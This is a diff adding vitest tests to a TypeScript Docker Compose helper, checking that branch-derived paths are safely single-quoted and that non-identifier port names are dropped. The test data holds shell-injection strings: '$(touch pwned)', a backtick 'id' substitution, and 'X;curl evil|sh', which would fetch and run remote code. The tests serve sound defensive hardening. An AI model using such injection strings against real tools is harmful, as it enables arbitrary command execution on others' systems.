@@ -1,4 +1,5 @@
 import { describe, it, expect } from 'vitest';
+import { execFileSync } from 'node:child_process';
 import { computeDockerPorts, dockerPortsFor, portBlockFor, buildComposeArgs, composeProject, dockerEnv } from '../../src/docker/dockerCompose';
 import type { ForemanConfig, Worktree } from '../../src/types';
 
@@ -93,6 +94,25 @@ describe('buildComposeArgs', () => {
     );
   });
 
+  // The worktree directory carries the branch name, and `$(…)` is a legal ref.
+  // These args are typed into a terminal (dockerUp) and run through exec
+  // (runCompose), where double quotes would still run the substitution.
+  it('single-quotes a compose path double quotes would not protect', () => {
+    const args = buildComposeArgs(
+      makeWorktree(),
+      '/repo/.worktrees/x$(touch pwned)/compose.yml',
+      "/repo/.worktrees/it's`id`/override.yml",
+      'up -d',
+    );
+    expect(args).toBe(
+      `-p "feat-a" -f '/repo/.worktrees/x$(touch pwned)/compose.yml' -f '/repo/.worktrees/it'\\''s\`id\`/override.yml' up -d`,
+    );
+    // And a real shell agrees: both paths arrive as literal text.
+    const argv = execFileSync('/bin/sh', ['-c', `printf '%s\\n' ${args}`], { encoding: 'utf8' }).split('\n');
+    expect(argv).toContain('/repo/.worktrees/x$(touch pwned)/compose.yml');
+    expect(argv).toContain("/repo/.worktrees/it's`id`/override.yml");
+  });
+
   it('never pins or layers for the main repo (it uses its own stack)', () => {
     expect(buildComposeArgs(makeWorktree({ isMain: true }), '/repo/base.yml', '/repo/override.yml', 'down')).toBe('down');
   });
@@ -109,6 +129,11 @@ describe('dockerEnv', () => {
 
   it('injects nothing for the main repo (it uses its own stack)', () => {
     expect(dockerEnv(makeWorktree({ isMain: true }), makeConfig())).toEqual({});
+  });
+
+  it('drops a configured name that is not an identifier — it would be a command, not an assignment', () => {
+    const env = dockerEnv(makeWorktree({ debugPort: 9899 }), makeConfig({ ports: ['HTTP_PORT', 'X;curl evil|sh'] }));
+    expect(env).toEqual({ HTTP_PORT: '20000' });
   });
 });
 
